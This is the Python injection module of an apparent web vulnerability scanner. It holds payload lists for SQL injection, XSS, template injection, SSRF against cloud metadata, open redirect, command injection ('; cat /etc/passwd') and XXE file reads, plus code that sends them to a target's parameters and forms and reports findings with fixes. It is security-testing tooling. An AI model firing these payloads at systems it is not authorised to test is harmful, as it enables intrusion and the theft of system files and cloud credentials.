"""
Potatoo — Injection Attacks Module
SQLi, XSS, SSTI, SSRF, Open Redirect, Command Injection, XXE
"""

import re
import time
import urllib.parse
from typing import List, Dict, Any


# ─── Payloads ──────────────────────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
    "' OR 'a'='a", "1' AND '1'='1", "' AND SLEEP(0)--",
    "'; WAITFOR DELAY '0:0:0'--", "1 AND 1=1",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "admin'--", "1' ORDER BY 1--", "1' ORDER BY 100--",
]

SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(5)--",              5, "MySQL"),
    ("1; WAITFOR DELAY '0:0:5'--",    5, "MSSQL"),
    ("' OR SLEEP(5)--",               5, "MySQL"),
    ("1 AND 5=(SELECT 5 FROM PG_SLEEP(5))", 5, "PostgreSQL"),
    ("' OR 1=1 AND SLEEP(5)--",       5, "MySQL"),
]

SQLI_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
    r"valid MySQL result", r"check the manual that corresponds to your MySQL",
    r"ORA-\d{5}", r"Oracle.*ORA-", r"Microsoft SQL Server",
    r"SQLSTATE\[", r"PDO.*Exception", r"pg_query\(\)",
    r"Unclosed quotation mark", r"quoted string not properly terminated",
    r"Syntax error.*query", r"SQLiteException", r"SQLITE_ERROR",
    r"Warning.*sqlite_", r"Incorrect syntax near",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "';alert(1);//",
    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "FreeMarker/Thymeleaf"),
    ("<%= 7*7 %>", "49", "ERB/EJS"),
    ("#{7*7}", "49", "Ruby"),
    ("{{7*'7'}}", "7777777", "Twig"),
    ("%{7*7}", "49", "Java EL"),
    ("*{7*7}", "49", "Spring/Thymeleaf"),
    ("{{config}}", "Config", "Flask/Jinja2"),
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",                         # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal",                # GCP metadata
    "http://169.254.169.254/metadata/instance",       # Azure metadata
    "http://0.0.0.0",
    "http://[::1]",
    "http://2130706433",                              # 127.0.0.1 decimal
    "http://017700000001",                            # 127.0.0.1 octal
    "dict://localhost:6379/info",
    "file:///etc/passwd",
]

OPEN_REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnUrl", "returnTo",
    "goto", "dest", "destination", "redir", "redirect_uri", "continue",
    "out", "view", "forward", "target", "site", "page", "ref",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2F%2E%2E",
    "\/\/evil.com",
    "//evil.com@target.com",
    "https:evil.com",
    "//google.com",
]

CMD_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; sleep 5",
    "| sleep 5",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

CMD_INJECTION_SIGNS = [
    r"uid=\d+\(", r"root:", r"/bin/bash", r"/etc/passwd",
    r"www-data", r"daemon:", r"nobody:",
]

XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>""",
]


class InjectionScanner:
    def __init__(self, target_url, rate_limiter, logger, reporter, session):
        self.target_url = target_url.rstrip("/")
        self.rl         = rate_limiter
        self.log        = logger
        self.reporter   = reporter
        self.session    = session

    def run(self, urls: List[str], forms: List[Dict], params: List[str]) -> None:
        self.log.module_start("Injection Testing")

        # Test URL params
        param_urls = [u for u in urls if "?" in u]
        for url in param_urls[:30]:
            self._test_url_sqli(url)
            self._test_url_xss(url)
            self._test_url_ssti(url)
            self._test_open_redirect(url)
            self._test_ssrf(url)

        # Test forms
        for form in forms[:20]:
            self._test_form_sqli(form)
            self._test_form_xss(form)
            self._test_form_ssti(form)

        self.log.module_done("Injection Testing")

    # ─── SQL Injection ─────────────────────────────────────────────────────────
    def _test_url_sqli(self, url: str):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return

        for param in params:
            # Error-based
            for payload in SQLI_ERROR_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()

                try:
                    self.rl.wait(test_url)
                    resp = self.session.get(test_url, timeout=10)
                    self.rl.notify_response(test_url, resp.status_code)

                    for err_pattern in SQLI_ERRORS:
                        if re.search(err_pattern, resp.text, re.IGNORECASE):
                            self.reporter.add_finding(
                                title="SQL Injection (Error-Based)",
                                severity="CRITICAL",
                                url=test_url,
                                description=f"Parameter '{param}' is vulnerable to SQL injection. Database error was triggered.",
                                evidence=f"Payload: {payload}\nError pattern matched: {err_pattern}",
                                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                                module="injections",
                                cvss=9.8,
                            )
                            self.log.finding("CRITICAL", f"SQLi found in: {url}", f"param={param}")
                            return
                except Exception as e:
                    self.log.debug(f"SQLi test error: {e}")

            # Time-based blind
            for payload, delay, db_type in SQLI_TIME_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                try:
                    self.rl.wait(test_url)
                    start = time.time()
                    resp  = self.session.get(test_url, timeout=delay + 5)
                    elapsed = time.time() - start

                    if elapsed >= delay - 0.5:
                        self.reporter.add_finding(
                            title=f"SQL Injection (Time-Based Blind) — {db_type}",
                            severity="CRITICAL",
                            url=test_url,
                            description=f"Parameter '{param}' caused a {elapsed:.1f}s delay, indicating {db_type} time-based blind SQLi.",
                            evidence=f"Payload: {payload}\nResponse time: {elapsed:.2f}s (expected ≥ {delay}s)",
                            remediation="Use parameterized queries / prepared statements.",
                            module="injections",
                            cvss=9.8,
                        )
                        self.log.finding("CRITICAL", f"Blind SQLi ({db_type}) in: {url}", f"param={param}")
                        return
                except Exception:
                    pass

    def _test_form_sqli(self, form: Dict):
        action = form.get("action", self.target_url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        if not inputs:
            return

        for inp in inputs:
            if inp.get("type", "text") in ("hidden", "submit", "button", "checkbox", "radio"):
                continue
            for payload in SQLI_ERROR_PAYLOADS[:5]:
                data = {i["name"]: "test" for i in inputs if i.get("name")}
                data[inp["name"]] = payload
                try:
                    self.rl.wait(action)
                    if method == "POST":
                        resp = self.session.post(action, data=data, timeout=10)
                    else:
                        resp = self.session.get(action, params=data, timeout=10)
                    self.rl.notify_response(action, resp.status_code)

                    for err in SQLI_ERRORS:
                        if re.search(err, resp.text, re.IGNORECASE):
                            self.reporter.add_finding(
                                title="SQL Injection in Form (Error-Based)",
                                severity="CRITICAL",
                                url=action,
                                description=f"Form field '{inp['name']}' is vulnerable to SQL injection.",
                                evidence=f"Payload: {payload}",
                                remediation="Use parameterized queries.",
                                module="injections",
                                cvss=9.8,
                            )
                            return
                except Exception as e:
                    self.log.debug(f"Form SQLi error: {e}")

    # ─── XSS ───────────────────────────────────────────────────────────────────
    def _test_url_xss(self, url: str):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return

        for param in params:
            for payload in XSS_PAYLOADS[:8]:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                try:
                    self.rl.wait(test_url)
                    resp = self.session.get(test_url, timeout=10)
                    self.rl.notify_response(test_url, resp.status_code)

                    # Check if payload is reflected unencoded
                    if payload in resp.text:
                        self.reporter.add_finding(
                            title="Cross-Site Scripting (Reflected XSS)",
                            severity="HIGH",
                            url=test_url,
                            description=f"Parameter '{param}' reflects user input without sanitization — XSS possible.",
                            evidence=f"Payload reflected: {payload}",
                            remediation="HTML-encode all user-supplied input before reflecting in responses. Implement CSP.",
                            module="injections",
                            cvss=7.4,
                        )
                        self.log.finding("HIGH", f"XSS in: {url}", f"param={param}")
                        return
                except Exception as e:
                    self.log.debug(f"XSS test error: {e}")

    def _test_form_xss(self, form: Dict):
        action = form.get("action", self.target_url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        if not inputs:
            return

        for inp in inputs:
            if inp.get("type", "text") in ("hidden", "submit", "button"):
                continue
            payload = "<script>alert(1)</script>"
            data    = {i["name"]: "test" for i in inputs if i.get("name")}
            data[inp["name"]] = payload
            try:
                self.rl.wait(action)
                if method == "POST":
                    resp = self.session.post(action, data=data, timeout=10)
                else:
                    resp = self.session.get(action, params=data, timeout=10)
                self.rl.notify_response(action, resp.status_code)

                if payload in resp.text:
                    self.reporter.add_finding(
                        title="XSS in Form Field",
                        severity="HIGH",
                        url=action,
                        description=f"Form field '{inp['name']}' reflects XSS payload.",
                        evidence=f"Payload: {payload}",
                        remediation="Sanitize and encode all form inputs before rendering.",
                        module="injections",
                        cvss=7.4,
                    )
                    return
            except Exception as e:
                self.log.debug(f"Form XSS error: {e}")

    # ─── SSTI ──────────────────────────────────────────────────────────────────
    def _test_url_ssti(self, url: str):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return

        for param in params:
            for payload, expected, engine in SSTI_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                try:
                    self.rl.wait(test_url)
                    resp = self.session.get(test_url, timeout=10)
                    self.rl.notify_response(test_url, resp.status_code)

                    if expected in resp.text:
                        self.reporter.add_finding(
                            title=f"Server-Side Template Injection (SSTI) — {engine}",
                            severity="CRITICAL",
                            url=test_url,
                            description=f"Parameter '{param}' is evaluated as a template expression — RCE possible.",
                            evidence=f"Payload: {payload}\nExpected output '{expected}' found in response.",
                            remediation="Never pass user input to template engines. Use sandboxed rendering.",
                            module="injections",
                            cvss=9.8,
                        )
                        self.log.finding("CRITICAL", f"SSTI ({engine}) in: {url}", f"param={param}")
                        return
                except Exception:
                    pass

    def _test_form_ssti(self, form: Dict):
        action = form.get("action", self.target_url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        for inp in inputs:
            if inp.get("type", "text") in ("hidden", "submit", "button"):
                continue
            for payload, expected, engine in SSTI_PAYLOADS:
                data = {i["name"]: "test" for i in inputs if i.get("name")}
                data[inp["name"]] = payload
                try:
                    self.rl.wait(action)
                    if method == "POST":
                        resp = self.session.post(action, data=data, timeout=10)
                    else:
                        resp = self.session.get(action, params=data, timeout=10)
                    if expected in resp.text:
                        self.reporter.add_finding(
                            title=f"SSTI in Form Field — {engine}",
                            severity="CRITICAL",
                            url=action,
                            description=f"Form field '{inp['name']}' is vulnerable to SSTI.",
                            evidence=f"Payload: {payload}, Expected: {expected}",
                            remediation="Never render user input through template engines.",
                            module="injections",
                            cvss=9.8,
                        )
                        return
                except Exception:
                    pass

    # ─── SSRF ──────────────────────────────────────────────────────────────────
    def _test_ssrf(self, url: str):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        ssrf_params = [p for p in params if any(
            k in p.lower() for k in ["url", "path", "src", "href", "uri", "dest", "redirect", "load", "fetch", "proxy"]
        )]
        for param in ssrf_params:
            for payload in SSRF_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                try:
                    self.rl.wait(test_url)
                    resp = self.session.get(test_url, timeout=8)
                    self.rl.notify_response(test_url, resp.status_code)

                    ssrf_indicators = [
                        r"ami-id", r"instance-id", r"hostname", r"local-ipv4",  # AWS metadata
                        r"computeMetadata", r"serviceAccounts",                  # GCP
                        r"root:.*:/bin/", r"daemon:.*:/usr",                     # /etc/passwd
                        r"Microsoft.*Azure",                                      # Azure
                    ]
                    for indicator in ssrf_indicators:
                        if re.search(indicator, resp.text, re.IGNORECASE):
                            self.reporter.add_finding(
                                title="Server-Side Request Forgery (SSRF)",
                                severity="CRITICAL",
                                url=test_url,
                                description=f"Parameter '{param}' triggers SSRF — internal/cloud resources accessible.",
                                evidence=f"Payload: {payload}\nResponse snippet: {resp.text[:300]}",
                                remediation="Validate and whitelist allowed URLs. Block internal network ranges.",
                                module="injections",
                                cvss=9.3,
                            )
                            self.log.finding("CRITICAL", f"SSRF in: {url}", f"param={param}")
                            return
                except Exception:
                    pass

    # ─── Open Redirect ─────────────────────────────────────────────────────────
    def _test_open_redirect(self, url: str):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        redirect_params = [p for p in params if p.lower() in [r.lower() for r in OPEN_REDIRECT_PARAMS]]

        for param in redirect_params:
            for payload in OPEN_REDIRECT_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(test_params)
                ).geturl()
                try:
                    self.rl.wait(test_url)
                    resp = self.session.get(test_url, timeout=8, allow_redirects=False)
                    self.rl.notify_response(test_url, resp.status_code)

                    location = resp.headers.get("Location", "")
                    if resp.status_code in (301, 302, 303, 307, 308) and (
                        "evil.com" in location or "google.com" in location
                    ):
                        self.reporter.add_finding(
                            title="Open Redirect",
                            severity="MEDIUM",
                            url=test_url,
                            description=f"Parameter '{param}' allows redirect to arbitrary external URLs.",
                            evidence=f"Payload: {payload}\nLocation header: {location}",
                            remediation="Validate redirect targets against a whitelist. Reject external redirects.",
                            module="injections",
                            cvss=6.1,
                        )
                        self.log.finding("MEDIUM", f"Open Redirect in: {url}", f"param={param}")
                        return
                except Exception:
                    pass
